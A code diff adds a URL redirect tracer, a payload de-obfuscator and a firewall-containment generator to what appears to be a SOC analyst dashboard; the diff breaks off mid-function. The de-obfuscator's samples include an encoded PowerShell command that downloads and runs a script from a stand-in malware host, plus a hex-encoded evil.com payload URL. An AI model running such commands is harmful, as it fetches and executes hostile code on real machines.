@@ -153,7 +153,7 @@
       <span class="font-extrabold text-lg tracking-tight text-white font-mono">LazySOC</span>
     </div>
 
-    <!-- TABS NAVIGATION (7 TABS) - Gracefully scrolls horizontally on narrow or split screens -->
+    <!-- TABS NAVIGATION (9 TABS) - Gracefully scrolls horizontally on narrow or split screens -->
     <nav class="flex items-center gap-1 p-1 bg-[#0d121e] border border-cyber-border rounded-xl overflow-x-auto custom-scrollbar flex-nowrap order-3 lg:order-2 w-full lg:w-auto max-w-full">
       <button onclick="switchTab('triage')" id="tab-btn-triage" class="tab-btn whitespace-nowrap flex-shrink-0 px-3 py-1.5 rounded-lg text-xs font-bold flex items-center gap-1.5 transition-all bg-cyber-cyan/15 text-cyber-cyan border border-cyber-cyan/30 glow-cyan">
         <i data-lucide="target" class="w-3.5 h-3.5"></i>
@@ -166,6 +166,14 @@
       <button onclick="switchTab('eml')" id="tab-btn-eml" class="tab-btn whitespace-nowrap flex-shrink-0 px-3 py-1.5 rounded-lg text-xs font-bold flex items-center gap-1.5 transition-all text-slate-400 hover:text-white">
         <i data-lucide="mail-warning" class="w-3.5 h-3.5"></i>
         <span>Phishing EML</span>
+      </button>
+      <button onclick="switchTab('urltrace')" id="tab-btn-urltrace" class="tab-btn whitespace-nowrap flex-shrink-0 px-3 py-1.5 rounded-lg text-xs font-bold flex items-center gap-1.5 transition-all text-slate-400 hover:text-white">
+        <i data-lucide="route" class="w-3.5 h-3.5"></i>
+        <span>URL Tracer</span>
+      </button>
+      <button onclick="switchTab('deobf')" id="tab-btn-deobf" class="tab-btn whitespace-nowrap flex-shrink-0 px-3 py-1.5 rounded-lg text-xs font-bold flex items-center gap-1.5 transition-all text-slate-400 hover:text-white">
+        <i data-lucide="binary" class="w-3.5 h-3.5"></i>
+        <span>De-obfuscator</span>
       </button>
       <button onclick="switchTab('mail')" id="tab-btn-mail" class="tab-btn whitespace-nowrap flex-shrink-0 px-3 py-1.5 rounded-lg text-xs font-bold flex items-center gap-1.5 transition-all text-slate-400 hover:text-white">
         <i data-lucide="shield-check" class="w-3.5 h-3.5"></i>
@@ -428,6 +436,11 @@
 
           <div class="flex flex-wrap items-center gap-2 justify-between sm:justify-end">
             <!-- SOC Operations Utilities -->
+            <button onclick="openContainmentModal()" class="flex-1 sm:flex-initial justify-center px-3 py-1.5 rounded-lg text-xs font-mono font-bold bg-rose-500/15 text-rose-300 border border-rose-500/30 hover:bg-rose-500/25 flex items-center gap-1.5 transition glow-red" title="Containment & Firewall Blocklists">
+              <i data-lucide="shield-ban" class="w-3.5 h-3.5"></i>
+              <span class="hidden sm:inline">Containment Rules</span>
+              <span class="sm:hidden">Blocklist</span>
+            </button>
             <button onclick="openSiemModal()" class="flex-1 sm:flex-initial justify-center px-3 py-1.5 rounded-lg text-xs font-mono font-bold bg-cyber-cyan/15 text-cyber-cyan border border-cyber-cyan/30 hover:bg-cyber-cyan/25 flex items-center gap-1.5 transition glow-cyan" title="SIEM Hunting Queries">
               <i data-lucide="terminal" class="w-3.5 h-3.5"></i>
               <span class="hidden sm:inline">SIEM Hunting Queries</span>
@@ -770,6 +783,172 @@
           </div>
         </div>
 
+      </div>
+
+    <!-- ============================================================
+         TAB: SAFE URL REDIRECT TRACER & DOMAIN AGE INSPECTOR
+         ============================================================ -->
+    <section id="view-urltrace" class="hidden space-y-6">
+      
+      <!-- Input Card -->
+      <div class="bg-cyber-card border border-cyber-border rounded-xl p-4 sm:p-6 space-y-4">
+        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-cyber-border/70 pb-3">
+          <div>
+            <h3 class="text-sm font-bold text-white flex items-center gap-2 font-mono">
+              <i data-lucide="route" class="w-4 h-4 text-cyber-cyan"></i>
+              Safe Passive URL Redirect Tracer & Domain Age Inspector
+            </h3>
+            <p class="text-xs text-slate-400 font-mono mt-0.5">Unshorten tracking URLs, trace redirect chains, inspect landing servers, and detect Newly Registered Domains (NRDs) safely</p>
+          </div>
+          <div class="flex items-center gap-2">
+            <button onclick="loadSampleUrlTrace('https://bit.ly/3phish-sample')" class="px-2.5 py-1 text-xs font-mono rounded-md bg-white/5 hover:bg-white/10 text-slate-300 border border-cyber-border flex items-center gap-1.5 transition">
+              <i data-lucide="flask-conical" class="w-3.5 h-3.5 text-cyber-cyan"></i>
+              <span>Sample Shortener</span>
+            </button>
+          </div>
+        </div>
+
+        <div class="flex flex-col sm:flex-row items-stretch sm:items-center gap-2.5 sm:gap-3">
+          <div class="relative flex-1">
+            <i data-lucide="link" class="w-4 h-4 text-slate-500 absolute left-3 top-3"></i>
+            <input 
+              type="text" 
+              id="urltrace-input" 
+              placeholder="Paste suspicious or shortened link (e.g. https://bit.ly/..., https://t.co/..., https://login-bank.xyz/verify)..."
+              class="w-full pl-9 pr-3 py-2.5 text-xs font-mono bg-[#090d16] border border-cyber-border rounded-lg text-slate-200 placeholder-slate-600 focus:outline-none focus:border-cyber-cyan"
+              onkeydown="if(event.key === 'Enter') runUrlTrace()"
+            >
+          </div>
+          <button 
+            id="btn-urltrace"
+            onclick="runUrlTrace()" 
+            class="w-full sm:w-auto justify-center px-5 py-2.5 rounded-lg bg-cyber-cyan text-slate-950 font-bold text-xs uppercase tracking-wider flex items-center gap-2 hover:bg-cyber-cyan/90 transition glow-cyan"
+          >
+            <i data-lucide="zap" class="w-4 h-4 fill-current"></i>
+            Trace URL
+          </button>
+        </div>
+      </div>
+
+      <!-- URL Trace Results Container -->
+      <div id="urltrace-results" class="hidden space-y-6">
+        
+        <!-- Summary Stats Cards -->
+        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4">
+          <div class="bg-cyber-card border border-cyber-border rounded-xl p-3.5 sm:p-4">
+            <div class="text-[11px] font-mono text-slate-400 font-bold uppercase">Redirect Hops</div>
+            <div id="urltrace-stat-hops" class="text-2xl font-mono font-bold text-white mt-1">0</div>
+            <div id="urltrace-stat-shortener" class="text-[10px] font-mono text-cyber-cyan uppercase mt-0.5">-</div>
+          </div>
+          <div class="bg-cyber-card border border-cyber-border rounded-xl p-4">
+            <div class="text-[11px] font-mono text-slate-400 font-bold uppercase">Domain Age Status</div>
+            <div id="urltrace-stat-age-badge" class="mt-1 text-sm font-bold font-mono">-</div>
+            <div id="urltrace-stat-regdate" class="text-[10px] font-mono text-slate-400 mt-0.5">-</div>
+          </div>
+          <div class="bg-cyber-card border border-cyber-border rounded-xl p-4">
+            <div class="text-[11px] font-mono text-slate-400 font-bold uppercase">Landing Server / Host</div>
+            <div id="urltrace-stat-server" class="text-sm font-mono font-bold text-cyber-cyan mt-1 truncate">-</div>
+            <div id="urltrace-stat-type" class="text-[10px] font-mono text-slate-400 truncate mt-0.5">-</div>
+          </div>
+          <div class="bg-cyber-card border border-cyber-border rounded-xl p-4">
+            <div class="text-[11px] font-mono text-slate-400 font-bold uppercase">SSL / TLS Certificate</div>
+            <div id="urltrace-stat-ssl-badge" class="text-xs font-mono font-bold text-slate-200 mt-1">-</div>
+            <div id="urltrace-stat-ssl-issuer" class="text-[10px] font-mono text-slate-400 mt-0.5 truncate">-</div>
+          </div>
+        </div>
+
+        <!-- Final Landing URL Callout -->
+        <div class="bg-cyber-card border border-cyber-border rounded-xl p-4 space-y-2">
+          <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2 border-b border-cyber-border/60 pb-2">
+            <span class="text-xs font-bold font-mono uppercase text-white flex items-center gap-1.5">
+              <i data-lucide="external-link" class="w-3.5 h-3.5 text-cyber-cyan"></i>
+              Final Destination Target
+            </span>
+            <div class="flex items-center gap-2">
+              <button onclick="sendLandingUrlToTriage()" class="px-2.5 py-1 rounded bg-cyber-cyan/15 hover:bg-cyber-cyan/25 text-cyber-cyan border border-cyber-cyan/30 text-xs font-mono font-bold transition flex items-center gap-1">
+                <i data-lucide="crosshair" class="w-3.5 h-3.5"></i>
+                <span>Triage in IoC Scanner</span>
+              </button>
+            </div>
+          </div>
+          <div id="urltrace-final-url-box" class="p-3 bg-[#090d16] rounded-lg border border-cyber-border font-mono text-xs text-cyber-cyan break-all select-all">
+            -
+          </div>
+        </div>
+
+        <!-- Hop-by-Hop Timeline Chain -->
+        <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-4">
+          <h4 class="text-xs font-bold text-white uppercase font-mono flex items-center gap-1.5 border-b border-cyber-border/60 pb-2">
+            <i data-lucide="git-commit" class="w-3.5 h-3.5 text-cyber-cyan"></i>
+            Detailed Redirection Sequence Trace
+          </h4>
+          <div id="urltrace-timeline-container" class="space-y-3 font-mono text-xs">
+            <!-- Injected via JS -->
+          </div>
+        </div>
+
+      </div>
+
+    </section>
+
+    <!-- ============================================================
+         TAB: SOC DE-OBFUSCATOR & CYBERCHEF-LITE STUDIO
+         ============================================================ -->
+    <section id="view-deobf" class="hidden space-y-6">
+      
+      <!-- Input Card -->
+      <div class="bg-cyber-card border border-cyber-border rounded-xl p-4 sm:p-6 space-y-4">
+        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-cyber-border/70 pb-3">
+          <div>
+            <h3 class="text-sm font-bold text-white flex items-center gap-2 font-mono">
+              <i data-lucide="binary" class="w-4 h-4 text-cyber-cyan"></i>
+              SOC De-obfuscator & CyberChef-Lite Studio
+            </h3>
+            <p class="text-xs text-slate-400 font-mono mt-0.5">Quickly decode PowerShell -enc commands, multi-layer Base64, Hex bytes, URL percent-encoding, ROT13, and single-byte XOR</p>
+          </div>
+          <div class="flex flex-wrap items-center gap-2">
+            <button onclick="loadSampleDeobf('powershell')" class="px-2.5 py-1 text-xs font-mono rounded-md bg-white/5 hover:bg-white/10 text-slate-300 border border-cyber-border flex items-center gap-1.5 transition">
+              <i data-lucide="terminal" class="w-3.5 h-3.5 text-cyber-cyan"></i>
+              <span>PowerShell -enc Sample</span>
+            </button>
+            <button onclick="loadSampleDeobf('hex')" class="px-2.5 py-1 text-xs font-mono rounded-md bg-white/5 hover:bg-white/10 text-slate-300 border border-cyber-border flex items-center gap-1.5 transition">
+              <i data-lucide="code" class="w-3.5 h-3.5 text-cyber-cyan"></i>
+              <span>Hex / URL Sample</span>
+            </button>
+          </div>
+        </div>
+
+        <div class="space-y-3">
+          <textarea 
+            id="deobf-raw-input"
+            rows="5"
+            placeholder="Paste obfuscated payload here...&#10;e.g.: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwBtAGEAbAB3AGEAcgBlAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAIgApACAAfAAgAEkARQBYAA==&#10;or Hex: 687474703a2f2f6576696c2e636f6d2f7061796c6f61642e657865"
+            class="w-full bg-[#090d16] border border-cyber-border rounded-lg p-3 text-xs font-mono text-slate-200 placeholder-slate-600 focus:outline-none focus:border-cyber-cyan custom-scrollbar"
+          ></textarea>
+
+          <div class="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-2.5">
+            <div class="flex items-center gap-2">
+              <button onclick="toggleDefangConvert()" class="px-3 py-1.5 text-xs font-mono font-bold rounded-lg bg-white/5 hover:bg-white/10 text-cyber-cyan border border-cyber-border flex items-center gap-1.5 transition">
+                <i data-lucide="shield-check" class="w-3.5 h-3.5"></i>
+                <span id="btn-defang-toggle-label">1-Click Defang / Refang</span>
+              </button>
+              <button onclick="clearDeobfInput()" class="px-3 py-1.5 text-xs font-mono rounded-lg bg-white/5 hover:bg-white/10 text-slate-400 hover:text-white transition">Clear</button>
+            </div>
+            <button 
+              id="btn-deobf"
+              onclick="runDeobfuscate()" 
+              class="w-full sm:w-auto justify-center px-5 py-2 rounded-lg bg-cyber-cyan text-slate-950 font-bold text-xs uppercase tracking-wider flex items-center gap-2 hover:bg-cyber-cyan/90 transition glow-cyan"
+            >
+              <i data-lucide="zap" class="w-4 h-4 fill-current"></i>
+              De-obfuscate & Inspect
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Deobfuscate Results Container -->
+      <div id="deobf-results" class="hidden space-y-6">
+        <!-- Injected dynamically via JS -->
       </div>
 
     </section>
@@ -1264,6 +1443,49 @@
     </div>
   </div>
 
+  <!-- MODAL: CONTAINMENT & FIREWALL BLOCKLIST GENERATOR -->
+  <div id="modal-containment" class="hidden fixed inset-0 z-50 bg-black/75 backdrop-blur-sm flex items-center justify-center p-3 sm:p-4">
+    <div class="bg-cyber-card border border-rose-500/30 rounded-xl max-w-3xl w-full p-4 sm:p-6 space-y-4 glow-red max-h-[90vh] flex flex-col">
+      <div class="flex items-center justify-between border-b border-cyber-border/70 pb-3">
+        <div>
+          <h3 class="text-sm font-bold text-white flex items-center gap-2">
+            <i data-lucide="shield-ban" class="w-4 h-4 text-rose-400"></i>
+            1-Click Threat Containment & Firewall Blocklist Generator
+          </h3>
+          <p class="text-[11px] font-mono text-slate-400 mt-0.5">Automated containment rules for host isolation, edge firewalls & EDR ban</p>
+        </div>
+        <button onclick="closeContainmentModal()" class="text-slate-400 hover:text-white text-lg">✕</button>
+      </div>
+
+      <!-- Platform Syntax Tabs -->
+      <div class="flex items-center gap-1.5 p-1 bg-[#090d16] border border-cyber-border rounded-lg text-xs font-mono overflow-x-auto custom-scrollbar">
+        <button onclick="switchContainmentTab('powershell')" id="containment-tab-powershell" class="px-3 py-1 rounded font-bold bg-rose-500/20 text-rose-300 border border-rose-500/40 whitespace-nowrap">Windows Firewall</button>
+        <button onclick="switchContainmentTab('linux')" id="containment-tab-linux" class="px-3 py-1 rounded text-slate-400 hover:text-white whitespace-nowrap">Linux iptables / UFW</button>
+        <button onclick="switchContainmentTab('fortigate')" id="containment-tab-fortigate" class="px-3 py-1 rounded text-slate-400 hover:text-white whitespace-nowrap">FortiGate CLI</button>
+        <button onclick="switchContainmentTab('cisco')" id="containment-tab-cisco" class="px-3 py-1 rounded text-slate-400 hover:text-white whitespace-nowrap">Cisco ASA</button>
+        <button onclick="switchContainmentTab('paloalto')" id="containment-tab-paloalto" class="px-3 py-1 rounded text-slate-400 hover:text-white whitespace-nowrap">Palo Alto</button>
+        <button onclick="switchContainmentTab('mikrotik')" id="containment-tab-mikrotik" class="px-3 py-1 rounded text-slate-400 hover:text-white whitespace-nowrap">MikroTik RouterOS</button>
+        <button onclick="switchContainmentTab('edr')" id="containment-tab-edr" class="px-3 py-1 rounded text-slate-400 hover:text-white whitespace-nowrap">EDR Hash Ban</button>
+      </div>
+
+      <!-- Script Output Box -->
+      <div class="relative flex-1 min-h-[220px]">
+        <textarea id="containment-script-output" readonly class="w-full h-full min-h-[200px] p-3 text-xs font-mono text-slate-200 bg-[#070a10] border border-cyber-border rounded-lg focus:outline-none custom-scrollbar select-all"></textarea>
+      </div>
+
+      <div class="flex flex-col-reverse sm:flex-row items-stretch sm:items-center justify-between gap-2.5 pt-2 border-t border-cyber-border">
+        <span id="containment-copy-status" class="text-[11px] font-mono text-emerald-400 text-center sm:text-left"></span>
+        <div class="flex items-center gap-2 justify-end">
+          <button onclick="closeContainmentModal()" class="w-full sm:w-auto px-3 py-1.5 text-xs text-slate-400 hover:text-white">Close</button>
+          <button onclick="copyContainmentScript()" class="w-full sm:w-auto justify-center px-4 py-1.5 text-xs font-bold rounded-lg bg-rose-500 text-white hover:bg-rose-600 transition flex items-center gap-1.5">
+            <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+            Copy Containment Script
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
   <!-- MODAL: SOC INCIDENT TICKET & ESCALATION NOTE -->
   <div id="modal-soc-ticket" class="hidden fixed inset-0 z-50 bg-black/75 backdrop-blur-sm flex items-center justify-center p-3 sm:p-4">
     <div class="bg-cyber-card border border-cyber-border rounded-xl max-w-2xl w-full p-4 sm:p-6 space-y-4 glow-purple max-h-[90vh] flex flex-col">
@@ -1368,7 +1590,7 @@ Content-Type: text/html; charset=UTF-8
     });
 
     function switchTab(tabId) {
-      ['triage', 'recon', 'eml', 'mail', 'feed', 'cve', 'cache'].forEach(t => {
+      ['triage', 'recon', 'eml', 'urltrace', 'deobf', 'mail', 'feed', 'cve', 'cache'].forEach(t => {
         const view = document.getElementById(`view-${t}`);
         const btn = document.getElementById(`tab-btn-${t}`);
         if (view) view.classList.add('hidden');
@@ -2039,6 +2261,92 @@ tags:
     }
 
     // ==========================================
+    // SOC 1-CLICK CONTAINMENT & FIREWALL GENERATOR
+    // ==========================================
+    let currentContainmentPlatform = 'powershell';
+    let containmentRuleCache = null;
+
+    async function openContainmentModal() {
+      if (!currentResults || !currentResults.length) {
+        alert("Please run a scan or paste indicators first to generate containment rules.");
+        return;
+      }
+
+      const modal = document.getElementById('modal-containment');
+      if (modal) {
+        modal.classList.remove('hidden');
+        lucide.createIcons();
+      }
+
+      const output = document.getElementById('containment-script-output');
+      output.value = "# Generating containment scripts from LazySOC backend engine...";
+
+      try {
+        const iocList = currentResults.map(r => r.ioc);
+        const res = await fetch('/api/containment', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            iocs: iocList,
+            comment: "LazySOC Rapid Incident Containment"
+          })
+        });
+
+        if (!res.ok) {
+          const err = await res.json();
+          output.value = `# Error generating containment rules: ${err.detail || 'Server error'}`;
+          return;
+        }
+
+        const data = await res.json();
+        containmentRuleCache = data.platforms || {};
+        switchContainmentTab(currentContainmentPlatform);
+      } catch (e) {
+        output.value = `# Network or execution error: ${e.message}`;
+      }
+    }
+
+    function closeContainmentModal() {
+      const modal = document.getElementById('modal-containment');
+      if (modal) modal.classList.add('hidden');
+    }
+
+    function switchContainmentTab(platform) {
+      currentContainmentPlatform = platform;
+      const platforms = ['powershell', 'linux', 'fortigate', 'cisco', 'paloalto', 'mikrotik', 'edr'];
+      platforms.forEach(p => {
+        const btn = document.getElementById(`containment-tab-${p}`);
+        if (btn) {
+          if (p === platform) {
+            btn.className = "px-3 py-1 rounded font-bold bg-rose-500/20 text-rose-300 border border-rose-500/40 whitespace-nowrap";
+          } else {
+            btn.className = "px-3 py-1 rounded text-slate-400 hover:text-white whitespace-nowrap";
+          }
+        }
+      });
+
+      const output = document.getElementById('containment-script-output');
+      if (containmentRuleCache && containmentRuleCache[platform]) {
+        output.value = containmentRuleCache[platform];
+      } else if (!containmentRuleCache) {
+        output.value = "# No rules available. Please click Containment Rules to generate.";
+      } else {
+        output.value = `# No specific containment syntax rules generated for ${platform}.`;
+      }
+    }
+
+    function copyContainmentScript() {
+      const text = document.getElementById('containment-script-output').value;
+      if (!text) return;
+      navigator.clipboard.writeText(text);
+      const status = document.getElementById('containment-copy-status');
+      if (status) {
+        status.innerText = "Script copied to clipboard!";
+        setTimeout(() => { status.innerText = ""; }, 2500);
+      }
+    }
+
+    // ==========================================
     // TAB 2: NETWORK RECON LOGIC
     // ==========================================
     function setReconSample(val) {
@@ -2315,9 +2623,15 @@ tags:
         linksList.innerHTML = links.map(link => `
           <div class="p-2 rounded bg-[#090d16] border border-cyber-border flex items-center justify-between gap-2">
             <span class="text-[11px] text-cyber-cyan truncate max-w-sm">${link}</span>
-            <button onclick="sendToTriage('${link}')" class="shrink-0 px-2 py-0.5 rounded text-[10px] font-bold bg-white/5 hover:bg-cyber-cyan/15 text-slate-300 hover:text-cyber-cyan border border-cyber-border transition">
-              Triage URL
-            </button>
+            <div class="flex items-center gap-1.5 shrink-0">
+              <button onclick="traceExtractedUrl('${link}')" class="px-2 py-0.5 rounded text-[10px] font-bold bg-cyber-cyan/10 hover:bg-cyber-cyan/25 text-cyber-cyan border border-cyber-cyan/30 transition flex items-center gap-1" title="Trace Redirect Chain">
+                <i data-lucide="route" class="w-3 h-3"></i>
+                <span>Trace</span>
+              </button>
+              <button onclick="sendToTriage('${link}')" class="px-2 py-0.5 rounded text-[10px] font-bold bg-white/5 hover:bg-cyber-cyan/15 text-slate-300 hover:text-cyber-cyan border border-cyber-border transition">
+                Triage URL
+              </button>
+            </div>
           </div>
         `).join('');
       } else {
@@ -2351,6 +2665,442 @@ tags:
       }
 
       lucide.createIcons();
+    }
+
+    function traceExtractedUrl(url) {
+      if (!url) return;
+      document.getElementById('urltrace-input').value = url;
+      switchTab('urltrace');
+      runUrlTrace();
+    }
+
+    // ==========================================
+    // TAB: URL REDIRECT TRACER & DOMAIN AGE
+    // ==========================================
+    let lastTracedData = null;
+
+    function loadSampleUrlTrace(sampleUrl) {
+      document.getElementById('urltrace-input').value = sampleUrl;
+      runUrlTrace();
+    }
+
+    async function runUrlTrace() {
+      const input = document.getElementById('urltrace-input');
+      const url = input.value.trim();
+      if (!url) return;
+
+      const btn = document.getElementById('btn-urltrace');
+      const oldHtml = btn.innerHTML;
+      btn.disabled = true;
+      btn.innerHTML = `<i data-lucide="loader-2" class="w-4 h-4 animate-spin"></i><span>Tracing...</span>`;
+      lucide.createIcons();
+
+      try {
+        const res = await fetch('/api/trace-url', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ url: url, max_hops: 8 })
+        });
+
+        if (!res.ok) {
+          const err = await res.json();
+          alert(err.detail || "URL Trace failed");
+          return;
+        }
+
+        const data = await res.json();
+        lastTracedData = data;
+        renderUrlTraceResults(data);
+      } catch (err) {
+        alert("Error executing URL trace: " + err.message);
+      } finally {
+        btn.disabled = false;
+        btn.innerHTML = oldHtml;
+        lucide.createIcons();
+      }
+    }
+
+    function renderUrlTraceResults(data) {
+      const resultsContainer = document.getElementById('urltrace-results');
+      resultsContainer.classList.remove('hidden');
+
+      // 1. Stats
+      document.getElementById('urltrace-stat-hops').innerText = data.total_hops || 0;
+      const shortenerEl = document.getElementById('urltrace-stat-shortener');
+      if (data.is_shortener) {
+        shortenerEl.innerText = "SHORTENER DETECTED";
+        shortenerEl.className = "text-[10px] font-mono text-amber-400 font-bold uppercase mt-0.5";
+      } else {
+        shortenerEl.innerText = data.has_redirects ? "REDIRECT CHAIN" : "DIRECT URL";
+        shortenerEl.className = "text-[10px] font-mono text-slate-400 uppercase mt-0.5";
+      }
+
+      // 2. Domain age
+      const domInfo = data.domain_info || {};
+      const ageBadge = document.getElementById('urltrace-stat-age-badge');
+      const regDate = document.getElementById('urltrace-stat-regdate');
+
+      if (domInfo.risk === 'CRITICAL_NEW_DOMAIN') {
+        ageBadge.className = "mt-1 text-sm font-bold font-mono text-red-400";
+        ageBadge.innerText = `● NRD (${domInfo.age_days}d old)`;
+      } else if (domInfo.risk === 'HIGH_RECENT_DOMAIN') {
+        ageBadge.className = "mt-1 text-sm font-bold font-mono text-amber-400";
+        ageBadge.innerText = `● RECENT (${domInfo.age_days}d old)`;
+      } else if (domInfo.risk === 'MEDIUM_YOUNG_DOMAIN') {
+        ageBadge.className = "mt-1 text-sm font-bold font-mono text-amber-300";
+        ageBadge.innerText = `● YOUNG (${domInfo.age_days}d old)`;
+      } else if (domInfo.risk === 'LOW_ESTABLISHED') {
+        ageBadge.className = "mt-1 text-sm font-bold font-mono text-emerald-400";
+        ageBadge.innerText = `● ESTABLISHED (${Math.floor((domInfo.age_days || 0) / 365)}y old)`;
+      } else {
+        ageBadge.className = "mt-1 text-sm font-bold font-mono text-slate-400";
+        ageBadge.innerText = "● AGE UNKNOWN";
+      }
+      regDate.innerText = domInfo.registered_date ? `Reg: ${domInfo.registered_date}` : (domInfo.note || '-');
+
+      // 3. Server info
+      const lastHop = data.hops && data.hops.length ? data.hops[data.hops.length - 1] : {};
+      document.getElementById('urltrace-stat-server').innerText = lastHop.server || "Not Disclosed";
+      document.getElementById('urltrace-stat-type').innerText = lastHop.content_type || "Unknown Type";
+
+      // 4. SSL
+      const sslInfo = data.ssl_info;
+      const sslBadge = document.getElementById('urltrace-stat-ssl-badge');
+      const sslIssuer = document.getElementById('urltrace-stat-ssl-issuer');
+      if (sslInfo && sslInfo.has_ssl) {
+        sslBadge.className = "text-xs font-mono font-bold text-emerald-400 mt-1";
+        sslBadge.innerText = "VALID TLS HANDSHAKE";
+        sslIssuer.innerText = sslInfo.issuer ? `Issuer: ${sslInfo.issuer}` : (sslInfo.note || '-');
+      } else if (sslInfo && !sslInfo.has_ssl) {
+        sslBadge.className = "text-xs font-mono font-bold text-red-400 mt-1";
+        sslBadge.innerText = "TLS ERROR / INVALID";
+        sslIssuer.innerText = sslInfo.error || "Failed handshake";
+      } else {
+        sslBadge.className = "text-xs font-mono font-bold text-slate-400 mt-1";
+        sslBadge.innerText = "NO TLS (HTTP)";
+        sslIssuer.innerText = "Cleartext HTTP destination";
+      }
+
+      // 5. Final URL
+      document.getElementById('urltrace-final-url-box').innerText = data.final_url;
+
+      // 6. Timeline hops
+      const timeline = document.getElementById('urltrace-timeline-container');
+      const hops = data.hops || [];
+      if (hops.length) {
+        timeline.innerHTML = hops.map((h, idx) => {
+          const isFinal = idx === hops.length - 1;
+          let statusBadgeClass = "bg-slate-500/20 text-slate-300";
+          if (h.status_code >= 200 && h.status_code < 300) statusBadgeClass = "bg-emerald-500/20 text-emerald-400 border border-emerald-500/30";
+          else if (h.status_code >= 300 && h.status_code < 400) statusBadgeClass = "bg-amber-500/20 text-amber-400 border border-amber-500/30";
+          else if (h.status_code >= 400 || h.status_code === 'ERROR') statusBadgeClass = "bg-red-500/20 text-red-400 border border-red-500/30";
+
+          return `
+            <div class="p-3 rounded-lg bg-[#090d16] border ${isFinal ? 'border-cyber-cyan/50 glow-cyan' : 'border-cyber-border'} space-y-1.5">
+              <div class="flex items-center justify-between">
+                <div class="flex items-center gap-2">
+                  <span class="px-2 py-0.5 rounded text-[10px] font-bold ${isFinal ? 'bg-cyber-cyan/20 text-cyber-cyan' : 'bg-white/5 text-slate-400'}">
+                    Hop #${h.hop} ${isFinal ? '(LANDING)' : ''}
+                  </span>
+                  <span class="px-1.5 py-0.5 rounded text-[10px] font-bold ${statusBadgeClass}">
+                    HTTP ${h.status_code}
+                  </span>
+                  <span class="text-slate-400 text-[11px] truncate hidden sm:inline">Server: ${h.server || 'Unknown'}</span>
+                </div>
+                <button onclick="sendToTriage('${h.url}')" class="px-2 py-0.5 rounded text-[10px] font-bold bg-white/5 hover:bg-cyber-cyan/15 text-slate-300 hover:text-cyber-cyan border border-cyber-border transition">
+                  Triage Hop
+                </button>
+              </div>
+              <div class="text-[11px] text-white break-all select-all font-mono">${h.url}</div>
+              ${h.redirect_to ? `
+                <div class="text-[10px] text-amber-300 flex items-center gap-1">
+                  <i data-lucide="corner-down-right" class="w-3 h-3 text-amber-400 shrink-0"></i>
+                  <span class="truncate">Redirects to: <span class="font-bold">${h.redirect_to}</span></span>
+                </div>
+              ` : ''}
+              ${h.error ? `
+                <div class="text-[10px] text-red-400">Error: ${h.error}</div>
+              ` : ''}
+            </div>
+          `;
+        }).join('');
+      } else {
+        timeline.innerHTML = `<span class="text-slate-500">No hops recorded.</span>`;
+      }
+
+      lucide.createIcons();
+    }
+
+    function sendLandingUrlToTriage() {
+      if (!lastTracedData || !lastTracedData.final_url) return;
+      document.getElementById('ioc-input').value = lastTracedData.final_url;
+      switchTab('triage');
+      handleInputDebounce();
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    // ==========================================
+    // TAB: SOC DE-OBFUSCATOR & CYBERCHEF-LITE
+    // ==========================================
+    let lastDeobfData = null;
+
+    function loadSampleDeobf(type) {
+      const input = document.getElementById('deobf-raw-input');
+      if (type === 'powershell') {
+        input.value = `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwBtAGEAbAB3AGEAcgBlAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAIgApACAAfAAgAEkARQBYAA==`;
+      } else if (type === 'hex') {
+        input.value = `687474703a2f2f6576696c2e636f6d2f7061796c6f61642e657865`;
+      }
+      runDeobfuscate();
+    }
+
+    function clearDeobfInput() {
+      document.getElementById('deobf-raw-input').value = '';
+      document.getElementById('deobf-results').classList.add('hidden');
+    }
+
+    async function toggleDefangConvert() {
+      const input = document.getElementById('deobf-raw-input');
+      const val = input.value;
+      if (!val.trim()) {
+        alert("Paste or type indicators/URLs into the box first.");
+        return;
+      }
+
+      const isDefanged = val.includes('[.]') || val.includes('(.)') || val.includes('hxxp');
+      try {
+        const res = await fetch('/api/deobfuscate', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ payload: val })
+        });
+        if (!res.ok) return;
+        const data = await res.json();
+        const lbl = document.getElementById('btn-defang-toggle-label');
+
+        if (isDefanged) {
+          input.value = data.refanged_version || val;
+          if (lbl) lbl.innerText = "Refanged to Clean";
+        } else {
+          input.value = data.defanged_version || val;
+          if (lbl) lbl.innerText = "Defanged for Safety";
+        }
+        setTimeout(() => {
+          if (lbl) lbl.innerText = "1-Click Defang / Refang";
+        }, 3000);
+      } catch (e) {
+        console.error(e);
+      }
+    }
+
+    async function runDeobfuscate() {
+      const input = document.getElementById('deobf-raw-input');
+      const payload = input.value.trim();
+      if (!payload) {
+        alert("Please paste or enter an obfuscated payload first.");
+        return;
+      }
+
+      const btn = document.getElementById('btn-deobf');
+      const oldHtml = btn.innerHTML;
+      btn.disabled = true;
+      btn.innerHTML = `<i data-lucide="loader-2" class="w-4 h-4 animate-spin"></i><span>Decoding...</span>`;
+      lucide.createIcons();
+
+      try {
